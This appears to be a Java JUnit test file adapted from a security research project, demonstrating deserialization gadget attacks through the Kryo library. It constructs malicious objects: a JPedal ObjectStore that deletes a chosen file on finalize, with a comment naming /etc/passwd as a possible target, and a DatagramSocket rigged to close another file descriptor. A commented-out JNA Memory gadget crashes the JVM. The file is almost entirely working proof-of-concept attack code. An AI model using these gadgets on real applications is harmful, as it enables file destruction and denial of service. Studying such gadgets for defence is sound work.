package cn.rui0.finalize;

import com.esotericsoftware.kryo.Kryo;
import com.esotericsoftware.kryo.io.Input;
import com.esotericsoftware.kryo.io.Output;
import junit.framework.TestCase;
import org.apache.commons.io.FileUtils;
import org.jpedal.io.ObjectStore;
import org.junit.Test;
import refutils.util.FieldHelper;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.DatagramSocket;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

/**
 * ------------------------------------------------------------
 * 代码参考： https://github.com/Contrast-Security-OSS/serialbox
 * ------------------------------------------------------------
 *
 * This test case affirms abuse cases for the following gadgets:
 * 
 * java.net.PlainDatagramSocketImpl - packaged with the JRE, and can be used to close any open file or socket
 * org.jpedal.io.ObjectStore - packaged with ColdFusion 10, and can be used to delete any file
 * com.sun.jna.Memory - packaged with lots of stuff, like Vert.X
 * 
 * These test cases should be run with HotSpot Java 8. Exploiting other JVMs may be require slight
 * modifications to the malicious objects created herein.
 */
public class KryoTest extends TestCase {

	private Kryo kryo;
	private ByteArrayOutputStream baos;
	private Output out;
	private Input in;

	@Override
	protected void setUp() throws Exception {
		kryo = new Kryo();
		baos = new ByteArrayOutputStream();
		out = new Output(baos);
	}
	
	@SuppressWarnings("unchecked")
	@Test
	public void testGenericCollectionStuffing() throws Exception {
		List<String> listOfStrings = new ArrayList<String>();
		listOfStrings.add("contrast");
		listOfStrings.add("security");
		listOfStrings.add("foo");
		
		FieldHelper listHelper = new FieldHelper(listOfStrings);
		listHelper.setValue("elementData", new Object[]{"i","stuffed", new Long(1)});
		
		kryo.writeObject(out, listOfStrings);
		in = new Input(out.toBytes());
		List<String> rebuiltList = kryo.readObject(in, new ArrayList<String>().getClass());
		assertEquals("i", rebuiltList.get(0));
		assertEquals("stuffed", rebuiltList.get(1));
		assertFalse(rebuiltList.get(2) instanceof String);
	}
	
	@SuppressWarnings({ "rawtypes", "unchecked" })
	@Test
	public void testCF10_JPedal() throws Exception {
		
		/*
		 * Write the test file to disk. This could easily be a firewall rules
		 * file, /etc/passwd, or something else hilarious.
		 */
		String targetFile = "target/fileToDelete.txt";
		FileUtils.write(new File(targetFile), "this fill will be deleted by ObjectStore#finalize()");
		
		/*
		 * Confirm the file was written successfully.
		 */
		assertTrue(new File(targetFile).exists());
		
		/*
		 * Create our malicious object that will delete the target file when
		 * finalized.
		 */
		ObjectStore store = new ObjectStore();
		HashMap map = new HashMap();
		map.put("can be anything", targetFile); // put the target file as a value in the map
		FieldHelper storeHelper = new FieldHelper(store);
		storeHelper.setValue("imagesOnDiskAsBytes", map);

		kryo.writeObject(out, store);
		
		/*
		 * Rebuild the malicious object as the victim app would.
		 */
		in = new Input(out.toBytes());
		ObjectStore rebuiltStore = kryo.readObject(in, ObjectStore.class);
		
		/*
		 * Call finalize() -- they made it protected so we have to reflect 
		 * the invocation. In a real attack scenario, the GC thread would 
		 * call this, but that's hard to build a test case around because 
		 * it's execution is not deterministic.
		 */
		callFinalize(rebuiltStore);
		
		/*
		 * Confirm that the gadget deleted the file.
		 */
		assertFalse(new File(targetFile).exists());
	}
	
	private void callFinalize(Object obj, Class<?> objClass) throws Exception {
		Method finalize = objClass.getDeclaredMethod("finalize", new Class[]{});
		finalize.setAccessible(true);
		finalize.invoke(obj, new Object[]{});
	}

	private void callFinalize(Object obj) throws Exception {
		Class<?> objClass = obj.getClass();
		callFinalize(obj, objClass);
	}
	
	@SuppressWarnings("resource")
	@Test
	public void testDatagramSocket() throws Throwable {
		File targetFile = new File("target/fd.txt");
		FileUtils.write(targetFile, "this is a test");
		
		FileInputStream fis = new FileInputStream(targetFile);
		assertTrue(fis.read() != -1);
		
		FieldHelper fdHelper = new FieldHelper(fis.getFD());
		
		int fd = (Integer) fdHelper.getValue("fd");
		
		DatagramSocket socket = new DatagramSocket();
		FieldHelper socketHelper = new FieldHelper(socket);
		Object/*java.net.DatagramSocketImpl*/ impl = socketHelper.getValue("impl");
		
		Constructor<?> constr = FileDescriptor.class.getDeclaredConstructor(int.class);
		constr.setAccessible(true);
		FileDescriptor maliciousFd = (FileDescriptor) constr.newInstance(fd);
		
		Class<?> superclass = impl.getClass().getSuperclass().getSuperclass();
		Field fdField = superclass.getDeclaredField("fd");
		fdField.setAccessible(true);
		fdField.set(impl, maliciousFd);
		
		/*
		 * Write out a malicious DatagramSocket to be read in by
		 * the victim app. We've changed its file descriptor to
		 * be the file descriptor of the FileInputStream above.
		 * 
		 * Once this malicious DatagramSocket gets garbage collected
		 * the FileInputStream should fail, since its link to the
		 * underlying OS and file system has been killed.
		 */
		kryo.writeObject(out, socket);
		
		/*
		 * Reconstruct the malicious socket, then call finalize() on it
		 * like the victim application will.
		 */
		in = new Input(out.toBytes());
		DatagramSocket rebuiltSocket = kryo.readObject(in, DatagramSocket.class);
		Field implField = rebuiltSocket.getClass().getDeclaredField("impl");
		implField.setAccessible(true);
		Object/*DatagramSocketImpl*/ socketImpl = implField.get(rebuiltSocket);
		callFinalize(socketImpl, socketImpl.getClass().getSuperclass());
		
		try {
			fis.read();
			fail("The file descriptor should have been closed, and an IOException (Bad file descriptor) should have been returned");
		} catch(IOException e) {
			//System.out.println(e);
			// this is expected
		}
	}
	
//	@Test
//	@Ignore
//	public void testJnaFree() throws Exception {
//		/*
//		 * Create a 1-byte buffer from malloc().
//		 */
//		Memory mem = new Memory(1);
//		mem.setByte(0, (byte) 0x01);
//		assertEquals(0x01, mem.getByte(0));
//
//		/*
//		 * Confirm that the protections around this API are in place.
//		 */
//		try {
//			mem.getByte(5);
//			fail("Shouldn't be able to access value outside of 1-byte buffer");
//		} catch (IndexOutOfBoundsException e) { }
//
//		/*
//		 * Set the hidden member of this field that points to the memory address
//		 * where the buffer is supposed to be allocated to some random address.
//		 */
//		FieldHelper memHelper = new FieldHelper(mem);
//		memHelper.setValue("peer", RandomUtils.nextLong());
//
//		/*
//		 * Serialize the now-malicious value to be read in by the target app.
//		 */
//		kryo.writeObject(out, mem);
//
//		/*
//		 * Deserialize the malicious value.
//		 */
//		in = new Input(out.toBytes());
//		Memory rebuiltMem = kryo.readObject(in, Memory.class);
//
//		/*
//		 * This call will crash the JVM entirely, unless your random() call
//		 * accidentally landed on a previously allocated buffer. Not likely.
//		 */
//		callFinalize(rebuiltMem);
//	}
	
}
